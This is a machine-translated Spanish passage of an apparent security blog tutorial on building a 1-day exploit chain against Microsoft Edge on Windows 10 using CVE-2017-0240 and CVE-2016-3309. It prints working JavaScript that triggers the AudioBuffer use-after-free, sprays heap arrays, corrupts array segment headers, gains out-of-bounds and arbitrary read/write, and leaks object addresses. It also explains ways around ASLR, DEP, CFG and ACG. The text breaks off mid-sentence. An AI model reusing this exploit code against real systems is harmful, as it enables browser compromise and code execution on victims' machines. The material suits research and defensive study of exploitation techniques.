<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üë¶üèª üåê üí™üèø Microsoft Edge de CVE a RCE en Windows 10 üëì üë®üèæ‚Äçüé® üë®üèª‚Äç‚öïÔ∏è</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="En el marco de este art√≠culo, consideraremos con suficiente detalle el proceso de escribir un exploit para una vulnerabilidad en Microsoft Edge, con l...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Microsoft Edge de CVE a RCE en Windows 10</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/455594/"><p><img src="https://habrastorage.org/webt/l6/oc/0a/l6oc0axkoxyoiss6dr77cytm1_e.jpeg" alt="Introducci√≥n"></p><br><p>  En el marco de este art√≠culo, consideraremos con suficiente detalle el proceso de escribir un exploit para una vulnerabilidad en Microsoft Edge, con la posterior salida del sandbox.  Si est√°s interesado en saber c√≥mo es este proceso, ¬°bienvenido con cat! </p><a name="habracut"></a><br><h2 id="vvedenie">  Introduccion </h2><br><p> En el √∫ltimo <code>Pwn2Own 2019</code> en Montreal, en la categor√≠a de navegadores, se <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">demostr√≥</a> una vulnerabilidad para hackear <code>Microsoft Edge</code> .  Para esto se utilizaron dos vulnerabilidades: <code>double free</code> en el renderizador y una vulnerabilidad l√≥gica para salir del sandbox.  Estas dos vulnerabilidades se cerraron recientemente y se les asign√≥ el <code>CVE</code> correspondiente: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><code>CVE-2019-0940</code></a> y <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><code>CVE-2019-0938</code></a> .  Puede leer m√°s sobre vulnerabilidades en el blog: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Pwn2Own 2019: Microsoft Edge Renderer Exploitation (CVE-2019-0940).</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Parte 1</a> y <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Pwn2Own 2019: Microsoft Eedge Sandbox Escape (CVE-2019-0938).</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Parte 2</a> . </p><br><p>  Como parte de nuestro art√≠culo, queremos mostrar el proceso de escritura de un exploit y cu√°nto tiempo y recursos se necesitan para esto usando el ejemplo de <code>Microsoft Edge</code> en <code>Windows 10</code> usando <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><code>CVE-2017-0240</code></a> y <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><code>CVE-2016-3309</code></a> .  Una de las diferencias es que si el exploit demostrado en <code>Pwn2Own</code> us√≥ una vulnerabilidad l√≥gica para salir del sandbox, entonces, en nuestro escenario, la vulnerabilidad en el kernel <code>Windows 10</code> se usar√° para salir del sandbox.  Como muestran los parches de <code>Microsoft</code> , hay muchas m√°s vulnerabilidades en el kernel que vulnerabilidades en la implementaci√≥n del sandbox.  Como resultado, es m√°s probable que se encuentre una cadena de vulnerabilidades de este tipo, y ser√° √∫til saber para los empleados de IS en las empresas. </p><br><h2 id="ishodnye-dannye">  Datos de origen </h2><br><p>  Este art√≠culo cubrir√° el proceso de escribir un exploit de 1 d√≠a para el navegador <code>Microsoft Edge</code> .  <code>CVE-2017-0240</code> ser√° operado.  La primera etapa de operaci√≥n se llevar√° a cabo sobre la base de materiales de la fuente [1], obtendremos una <code>arbitrary address read/write</code> primitiva, y tambi√©n nos familiarizaremos con varias t√©cnicas que pueden ser √∫tiles al explotar tales vulnerabilidades.  A continuaci√≥n, le presentaremos la herramienta <code>pwn.js</code> , que lo ayudar√° a obtener una llamada a funciones arbitrarias basadas en lectura y escritura arbitrarias, y tambi√©n discutiremos varias <code>mitigations</code> y formas de evitarlas.  En la √∫ltima etapa, se aprovechar√° la vulnerabilidad del kernel de Windows <code>CVE-2016-3309</code> para aumentar los privilegios, eludir <code>AppContainer</code> restricciones de <code>AppContainer</code> y obtener el control completo sobre la m√°quina atacada. </p><br><p>  La operaci√≥n se realizar√° en el stand con <code>Microsoft Windows 10 Pro 1703 (10.0.15063)</code> y el navegador <code>Microsoft Edge (40.15063.0.0)</code> . </p><br><h2 id="shag-1-poluchenie-arbitrary-address-readwrite-primitiva">  Paso 1. Obtener una <code>arbitrary address read/write</code> primitiva </h2><br><h3 id="opisanie-uyazvimosti-i-poluchenie-oob">  Descripci√≥n de la vulnerabilidad y obtenci√≥n de <code>OOB</code> </h3><br><p>  Una vulnerabilidad de tipo <code>use-after-free</code> presente en el m√©todo <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">copyFromChannel</a> del objeto <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Audio Buffer</a> . </p><br><blockquote>  AudioBuffer es la interfaz de un recurso de audio breve ubicado en la memoria y creado a partir de un archivo de audio utilizando el m√©todo AudioContext.decodeAudioData (), o de los datos de origen utilizando el m√©todo AudioContext.createBuffer ().  Los datos de audio colocados en AudioBuffer se pueden reproducir en AudioBufferSourceNode. </blockquote><p>  La presentaci√≥n de <code>The Advanced Exploitation of 64-bit Edge Browser Use-After-Free Vulnerability on Windows 10</code> proporciona un an√°lisis detallado de la vulnerabilidad y el parche.  Cuando se <code>copyFromChannel</code> m√©todo <code>copyFromChannel</code> , el contenido del canal del b√∫fer de audio se copia en el b√∫fer de <code>destination</code> especificado por el primer argumento.  El m√©todo tambi√©n acepta el n√∫mero de canal ( <code>channelNumber</code> ) y el desplazamiento en el b√∫fer de audio ( <code>startInChannel</code> ), a partir del cual es necesaria la copia.  Antes de copiar directamente los datos al <code>destination</code> en la funci√≥n <code>CDOMAudioBuffer::Var_copyFromChannel</code> , el b√∫fer de <code>destination</code> se almacena en cach√© (la direcci√≥n y el tama√±o del b√∫fer se almacenan en variables de funci√≥n local en la pila) y los valores de objeto <code>channelNumber</code> y <code>startInChannel</code> se <code>startInChannel</code> al tipo <code>Int</code> , para lo cual se llama al m√©todo <code>valueOf</code> de los objetos convertidos.  La vulnerabilidad es que un b√∫fer en cach√© se puede liberar en el momento de la conversi√≥n de tipos en el m√©todo anulado del objeto <code>valueOf</code> .  Para la verificaci√≥n, utilizamos el siguiente c√≥digo: </p><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">// ,     var t2 = new Float32Array(0x20000); var ta = new Uint8Array(t2.buffer); for (i=0;i&lt;t2.length;i++) t2[i] = 0x66; var myctx = new AudioContext(); var audioBuf = myctx.createBuffer(1, 0x25, 22050); //   -   var t = audioBuf.getChannelData(0); var ta2 = new Uint8Array(t.buffer); for(i=0;i&lt;ta2.length;i++) ta2[i]=0x55; //     valueOf var obj = { valueOf: function () { //   var worker = new Worker('worker.js'); worker.postMessage(0, [t2.buffer]); worker.terminate(); worker = null; //    sleep(1000); return 0; } }; //   audioBuf.copyFromChannel(t2, obj, 0);</span></span></code> </pre> <br><p>  Este c√≥digo utiliza la tecnolog√≠a de <code>Web Workers</code> para liberar el b√∫fer.  Despu√©s de haber creado un <code>Worker</code> vac√≠o, podemos enviarle un mensaje utilizando el m√©todo <code>postMessage</code> .  El segundo argumento de <code>transfer</code> opcional de este m√©todo acepta una matriz de objetos <code>Transferable</code> ( <code>ArrayBuffer</code> , <code>MessagePost</code> o <code>ImageBitmap</code> ), los derechos del objeto se transferir√°n a <code>Worker</code> y el objeto ya no estar√° disponible en el contexto actual, por lo que se puede eliminar.  Despu√©s de esto, se produce una llamada a la <code>sleep</code> , una funci√≥n que detiene temporalmente la ejecuci√≥n de un programa (se implementa de forma independiente).  Esto es necesario para que el sistema de recolecci√≥n de basura ( <code>GC</code> , <code>Garbage Collector</code> ) logre liberar el b√∫fer, cuyos derechos fueron transferidos. </p><br><blockquote>  Los trabajadores web proporcionan un medio simple para ejecutar scripts en el hilo de fondo.  El subproceso de trabajo puede realizar tareas sin interferir con la interfaz de usuario.  Adem√°s, pueden hacer E / S usando XMLHttpRequest (aunque los atributos responseXML y channel siempre ser√°n nulos).  Un trabajador existente puede enviar mensajes JavaScript al c√≥digo creador a trav√©s del controlador de eventos especificado por este c√≥digo (y viceversa). </blockquote><p>  Al ejecutar este c√≥digo en Edge bajo el depurador, puede obtener el siguiente bloqueo. </p><br><p><img src="https://habrastorage.org/webt/iv/vx/zx/ivvxzxzff-qsxl8pxdqy6pmkbnq.png" alt="Paso 01 accidente"></p><br><p>  Como resultado, la llamada a <code>copyFromChannel</code> intenta copiar el contenido del b√∫fer de audio en el √°rea de memoria no asignada.  Para aprovechar la vulnerabilidad, es necesario lograr la asignaci√≥n de cualquier objeto en esta √°rea de memoria.  En este caso, el segmento de matriz es perfecto. </p><br><p>  Las matrices en <code>Chakra</code> (el motor <code>JS</code> utilizado en el navegador <code>Edge</code> ) se organizan de la siguiente manera: el objeto de la matriz tiene un tama√±o fijo, los punteros a los objetos de la matriz (o valores, en el caso de <code>IntArray</code> ) se almacenan en un √°rea de memoria separada: el segmento, el puntero que est√° contenido en el objeto matriz.  El encabezado del segmento contiene informaci√≥n diversa, incluido el tama√±o del segmento, que corresponde al tama√±o de la matriz.  El tama√±o de la matriz tambi√©n est√° presente en el objeto de la matriz en s√≠.  Esquem√°ticamente, se ve as√≠: </p><br><p><img src="https://habrastorage.org/webt/kh/i1/wr/khi1wrtatqg2jq2bkhaz29b7u68.jpeg" alt="Estructura de matriz"></p><br><p>  Por lo tanto, si logramos seleccionar el segmento de matriz en el espacio previamente liberado, entonces podemos sobrescribir el encabezado del segmento de matriz con el contenido del b√∫fer de audio.  Para hacer esto, modificamos el c√≥digo anterior agregando las siguientes l√≠neas despu√©s de <code>sleep(1000);</code>  : </p><br><pre> <code class="javascript hljs">... <span class="hljs-comment"><span class="hljs-comment">/*        ,    .   arr        */</span></span> arr = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Array</span></span>(<span class="hljs-number"><span class="hljs-number">128</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; arr.length; i++) { arr[i] = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Array</span></span>(<span class="hljs-number"><span class="hljs-number">0x3ff0</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> j = <span class="hljs-number"><span class="hljs-number">0</span></span>; j &lt; arr[i].length; j++) arr[i][j] = <span class="hljs-number"><span class="hljs-number">0x30303030</span></span>; } ...</code> </pre> <br><p>  El tama√±o de las matrices se selecciona de modo que el tama√±o del segmento de la matriz ocupe todo el segmento de almacenamiento din√°mico (la pieza m√≠nima indivisible de memoria de almacenamiento din√°mico, cuyo tama√±o es 0x10000 bytes).  Ejecute este c√≥digo, especificando la funci√≥n <code>memcpy</code> como punto de interrupci√≥n (habr√° muchas llamadas <code>memcpy</code> , por lo que tiene sentido detenerse primero en <code>edgehtml!WebCore::AudioBufferData::copyBufferData</code> ), en el que ocurri√≥ el bloqueo.  Obtenemos el siguiente resultado: </p><br><p><img src="https://habrastorage.org/webt/nn/5u/yn/nn5uyncl0hvooyoar3lnua8cc8u.png" alt="Paso 02"></p><br><p>  Genial  Ahora podemos sobrescribir el encabezado del segmento de matriz con nuestros propios valores.  Los valores m√°s interesantes en este caso son el tama√±o de la matriz, cuyo desplazamiento podemos ver en la captura de pantalla anterior.  Cambie el contenido del b√∫fer de audio de la siguiente manera: </p><br><pre> <code class="javascript hljs">... var t = audioBuf.getChannelData(<span class="hljs-number"><span class="hljs-number">0</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ta2 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Uint32Array</span></span>(t.buffer); ta2[<span class="hljs-number"><span class="hljs-number">0</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">1</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">2</span></span>] = <span class="hljs-number"><span class="hljs-number">0xffe0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">3</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">4</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">5</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">6</span></span>] = <span class="hljs-number"><span class="hljs-number">0xfba6</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">7</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">8</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">9</span></span>] = <span class="hljs-number"><span class="hljs-number">0x7fffffff</span></span> - <span class="hljs-number"><span class="hljs-number">2</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">10</span></span>] = <span class="hljs-number"><span class="hljs-number">0x7fffffff</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">11</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">12</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">13</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">14</span></span>] = <span class="hljs-number"><span class="hljs-number">0x40404040</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">15</span></span>] = <span class="hljs-number"><span class="hljs-number">0x50505050</span></span>; ...</code> </pre> <br><p>  Preste atenci√≥n a los valores de <code>ta2[14]</code> y <code>ta2[15]</code> ; ya no se refieren al encabezado del segmento, sino a los valores de la matriz en s√≠.  Con esto, podemos determinar la matriz que necesitamos en la matriz <code>arr</code> global de la siguiente manera: </p><br><pre> <code class="javascript hljs">... for(<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; arr.length; i++) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(arr[i][<span class="hljs-number"><span class="hljs-number">0</span></span>] == <span class="hljs-number"><span class="hljs-number">0x40404040</span></span> &amp;&amp; arr[i][<span class="hljs-number"><span class="hljs-number">1</span></span>] == <span class="hljs-number"><span class="hljs-number">0x50505050</span></span>) { alert(<span class="hljs-string"><span class="hljs-string">'Target array idx: '</span></span> + i); target_idx = i; target_arr = arr[i]; <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } }</code> </pre> <br><p>  Si, como resultado, se encontr√≥ una matriz, cuyos dos primeros elementos se modificaron de cierta manera, entonces todo est√° bien.  Ahora tenemos una matriz cuyo tama√±o de segmento es m√°s grande de lo que realmente es.  Las matrices restantes se pueden liberar. </p><br><p>  Aqu√≠ es necesario recordar que el tama√±o de la matriz existe en dos entidades: en el objeto de matriz, donde permaneci√≥ sin cambios, y en el segmento de matriz, donde lo aumentamos.  Resulta que el tama√±o en el objeto de matriz se ignora si el c√≥digo se ejecuta en el modo <code>JIT</code> y se ha optimizado.  Esto se logra f√°cilmente, por ejemplo, de la siguiente manera: </p><br><pre> <code class="javascript hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">arr_get</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">idx</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> target_arr[idx]; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">arr_set</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">idx, val</span></span></span><span class="hljs-function">) </span></span>{ target_arr[idx] = val; } <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; <span class="hljs-number"><span class="hljs-number">0x3ff0</span></span>; i++) { arr_set(i, arr_get(i)); }</code> </pre> <br><p>  Despu√©s de eso, utilizando las <code>arr_set</code> <code>arr_get</code> y <code>arr_set</code> puede ir m√°s all√° de los l√≠mites de la matriz ( <code>OOB</code> , <code>out-of-bound</code> ). </p><br><h3 id="ispolzovanie-oob-dlya-polucheniya-primitiva-chteniya-i-zapisi-po-proizvolnomu-adresu">  Usando <code>OOB</code> para obtener la primitiva de leer y escribir en una direcci√≥n arbitraria </h3><br><p>  En esta secci√≥n, consideramos una t√©cnica que le permite leer y escribir en una direcci√≥n arbitraria utilizando <code>OOB</code> .  El m√©todo por el cual obtenemos esto ser√° similar al utilizado en la fuente [1], pero tambi√©n habr√° cambios significativos. </p><br><p>  En la versi√≥n utilizada de <code>Edge</code> los bloques de memoria para el mont√≥n se asignan secuencialmente, debido a lo cual, al asignar una gran cantidad de objetos, tarde o temprano aparecer√°n despu√©s del segmento de matriz, m√°s all√° de los cuales podemos ir. </p><br><p>  Primero, nos da la capacidad de leer un puntero a una tabla virtual de m√©todos de objetos ( <code>vftable</code> ), para que podamos evitar la aleatorizaci√≥n del espacio de direcciones del proceso ( <code>ASLR</code> ).  ¬øPero el acceso a qu√© objetos nos ayudar√° a lograr una lectura y escritura arbitrarias?  Un par de objetos <code>DataView</code> son geniales para esto. </p><br><blockquote>  DataView proporciona una interfaz de bajo nivel para leer y escribir m√∫ltiples tipos num√©ricos en un ArrayBuffer binario, independientemente del orden de los bytes de la plataforma. </blockquote><p>  La estructura interna de <code>DataView</code> contiene un puntero a un b√∫fer.  Para leer y escribir en una direcci√≥n arbitraria, por ejemplo, podemos construir una cadena de dos <code>DataView</code> ( <code>dv1</code> y <code>dv2</code> ) de la siguiente manera: como el b√∫fer <code>dv1</code> especifique la direcci√≥n <code>dv2</code> accediendo a la matriz.  Ahora usando <code>dv1</code> podemos cambiar la direcci√≥n del b√∫fer <code>dv2</code> , debido a lo cual se logra una lectura y escritura arbitrarias.  Esquem√°ticamente, esto se puede representar de la siguiente manera: </p><br><p><img src="https://habrastorage.org/webt/ch/9n/do/ch9ndofe4zamumfvihnmv6xtg-o.jpeg" alt="Direcci√≥n arbitraria de lectura / escritura"></p><br><p>  Para usar este m√©todo, debe aprender a determinar las direcciones de los objetos en la memoria.  Para hacer esto, existe la siguiente t√©cnica: debe crear una nueva <code>Array</code> , usar <code>OOB</code> para guardar su <code>vftable</code> y <code>typeId</code> (los dos primeros campos de 64 bits de la estructura) y asignar el objeto al que la direcci√≥n interesa al primer elemento de la matriz.  Luego, debe restaurar los <code>typeId</code> <code>vftable</code> y <code>typeId</code> previamente guardados.  Ahora la palabra doble junior y senior de la direcci√≥n del objeto se puede obtener haciendo referencia al primer y segundo elemento de la matriz.  El hecho es que, por defecto, la nueva matriz es <code>IntArray</code> , y los valores de 4 bytes de la matriz se almacenan en su segmento tal como est√°n.  Al asignar un objeto a una matriz, la matriz se convierte en una <code>ObjectArray</code> y su segmento se usa para almacenar las direcciones de los objetos.  La conversi√≥n cambia <code>vftable</code> y <code>typeId</code> .  En consecuencia, si restauramos los valores originales <code>vftable</code> y <code>typeId</code> , a trav√©s de los elementos de esta matriz podemos acceder al segmento directamente.  El proceso descrito esquem√°ticamente se puede representar de la siguiente manera: </p><br><p><img src="https://habrastorage.org/webt/un/np/-z/unnp-zlvr6ql9m5_f9rmxrdwt20.jpeg" alt="Fuga de puntero"></p><br><p>  La funci√≥n para obtener la direcci√≥n se ver√° as√≠: </p><br><pre> <code class="javascript hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">addressOf</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">obj</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> hdr_backup = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Array</span></span>(<span class="hljs-number"><span class="hljs-number">4</span></span>); <span class="hljs-comment"><span class="hljs-comment">//  vftable  typeId intarr_object for(var i = 0; i &lt; 4; i++) hdr_backup[i] = arr_get(intarr_idx + i); intarr_object[0] = obj; //  vftable  typeId intarr_object for(var i = 0; i &lt; 4; i++) arr_set(intarr_idx + i, hdr_backup[i]); //         return [intarr_object[0], intarr_object[1]]; }</span></span></code> </pre> <br><p>  Una pregunta abierta sigue siendo la creaci√≥n de los objetos necesarios y su b√∫squeda usando <code>OOB</code> .  Como se mencion√≥ anteriormente, al asignar una gran cantidad de objetos, tarde o temprano comenzar√°n a destacarse despu√©s del segmento de matriz, m√°s all√° del cual podemos ir.  Para encontrar los objetos necesarios, solo necesita pasar por los √≠ndices fuera de la matriz en busca de los objetos necesarios.  Porque  todos los objetos del mismo tipo se encuentran en un segmento del mont√≥n, puede optimizar la b√∫squeda y recorrer los segmentos del mont√≥n en incrementos de <code>0x10000</code> , y verificar solo los primeros valores desde el comienzo de cada segmento del mont√≥n.  Para identificar objetos, puede establecerles valores √∫nicos para algunos par√°metros (por ejemplo, para <code>DataView</code> puede ser <code>byteOffset</code> ) o, utilizando las constantes ya conocidas en la estructura del objeto (por ejemplo, en la versi√≥n utilizada de <code>Edge</code> en <code>IntArray</code> , el valor <code>0x10005</code> siempre se encuentra en <code>0x18</code> ). </p><br><p>  Al combinar todas las t√©cnicas anteriores, puede leer y escribir en una direcci√≥n arbitraria.  A continuaci√≥n se muestra una captura de pantalla de lectura de objetos de memoria <code>DataView</code> . </p><br><p><img src="https://habrastorage.org/webt/fe/i5/o3/fei5o3k0zh3pogdmb5diifeick8.png" alt="P√©rdida de memoria"></p><br><h2 id="shag-2-vypolnenie-proizvolnyh-funkciy-api">  Paso 2. Realizar funciones arbitrarias de API </h2><br><p>  En esta etapa, pudimos leer y escribir en una direcci√≥n arbitraria dentro del proceso de visualizaci√≥n del contenido de <code>Edge</code> .  Considere las principales tecnolog√≠as que deber√≠an interferir con el funcionamiento posterior de la aplicaci√≥n y sus soluciones.  Ya escribimos una breve serie de art√≠culos sobre <code>  app specific security mitigation</code> ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">parte 1, introducci√≥n</a> , <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">parte 2, Internet Explorer y Edge</a> , <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">parte 3, Google Chrome</a> ), pero tenga en cuenta que los desarrolladores no se quedan quietos y agregan nuevas herramientas a sus productos protecci√≥n </p><br><h3 id="randomizaciya-adresnogo-prostranstva-aslr">  Aleatorizaci√≥n del espacio de direcciones ( <code>ASLR</code> ) </h3><br><blockquote>  ASLR (asignaci√≥n aleatoria del dise√±o del espacio de direcciones en ingl√©s) es una tecnolog√≠a utilizada en sistemas operativos que cambia aleatoriamente la ubicaci√≥n de estructuras de datos importantes en el espacio de direcciones del proceso, a saber: im√°genes de archivos ejecutables, bibliotecas cargadas, montones y apilar. </blockquote><p>  Arriba, aprendimos a leer las direcciones de las tablas de clases virtuales, utiliz√°ndolas, podemos calcular f√°cilmente la direcci√≥n base del m√≥dulo <code>Chakra.dll</code> , por lo que <code>ASLR</code> no presenta problemas para una operaci√≥n adicional. </p><br><h3 id="data-execution-protection-dep-nx">  Protecci√≥n de ejecuci√≥n de datos ( <code>DEP</code> , <code>NX</code> ) </h3><br><blockquote>  La Prevenci√≥n de ejecuci√≥n de datos (DEP) es una funci√≥n de seguridad integrada en Linux, Mac OS X, Android y Windows que impide que una aplicaci√≥n ejecute c√≥digo desde un √°rea de memoria marcada como "solo datos".  Evitar√° algunos ataques que, por ejemplo, guardan c√≥digo en dicha √°rea utilizando desbordamientos de b√∫fer. </blockquote><p>  Una forma de evitar esta protecci√≥n es llamar a <code>VirtualAlloc</code> usando cadenas <code>ROP</code> .  Pero en el caso de <code>Edge</code> este m√©todo no funcionar√° debido a <code>ACG</code> (ver m√°s abajo). </p><br><h3 id="control-flow-guard-cfg">  Control de flujo de <code>CFG</code> ( <code>CFG</code> ) </h3><br><blockquote>  <code>CFG</code> es un mecanismo de protecci√≥n destinado a complicar el proceso de explotaci√≥n de vulnerabilidades binarias en aplicaciones de usuario y en modo kernel.  El trabajo de este mecanismo consiste en validar llamadas indirectas, lo que evita que un atacante intercepte el hilo de ejecuci√≥n (por ejemplo, sobrescribiendo la tabla de funciones virtuales) </blockquote><p>  Esta tecnolog√≠a controla solo llamadas indirectas, por ejemplo, llamadas a m√©todos de la tabla virtual de funciones de objeto.  Las direcciones de retorno en la pila no est√°n controladas, y esto se puede usar para construir cadenas <code>ROP</code> .  El uso futuro de <code>ROP/JOP/COP</code> cadenas <code>ROP/JOP/COP</code> puede verse obstaculizado por <code>Intel</code> nueva tecnolog√≠a de <code>Intel</code> : <code>Control-flow Enforcement Technology</code> ( <code>CET</code> ).  Esta tecnolog√≠a consta de dos partes: </p><br><ol><li>  <code>Shadow Stack</code> sombra (pila de sombra): se utiliza para controlar las direcciones de retorno y protege contra cadenas <code>ROP</code> ; </li><li>  <code>Indirect Branch Tracking</code> es un m√©todo de protecci√≥n contra cadenas <code>JOP/COP</code> .  Es una nueva instrucci√≥n <code>ENDBRANCH</code> , que marca todas las direcciones de transici√≥n v√°lidas para instrucciones de <code>call</code> y <code>jmp</code> . </li></ol><br><h3 id="arbitrary-code-guard-acg">  Guardia de c√≥digo arbitrario ( <code>ACG</code> ) </h3><br><blockquote>  <code>ACG</code> es una tecnolog√≠a que impide la generaci√≥n din√°mica de c√≥digo (est√° prohibido asignar √°reas de memoria <code>VirtaulAlloc</code> usando <code>VirtaulAlloc</code> ) y sus modificaciones (es imposible <code>VirtaulAlloc</code> √°rea de memoria disponible como ejecutable) </blockquote><p>  Esta protecci√≥n, como <code>CFG</code> , no impide el uso de cadenas <code>ROP</code> . </p><br><h3 id="appcontainer-isolation">  AppContainer Isolation </h3><br><blockquote>  AppContainer es una tecnolog√≠a de Microsoft que le permite aislar un proceso ejecut√°ndolo en un entorno de espacio aislado.  Esta tecnolog√≠a restringe el acceso del proceso a las credenciales, los dispositivos, el sistema de archivos, la red, otros procesos y ventanas y tiene como objetivo minimizar el potencial del software malicioso que tiene la capacidad de ejecutar c√≥digo arbitrario en el proceso. </blockquote><p>  Esta 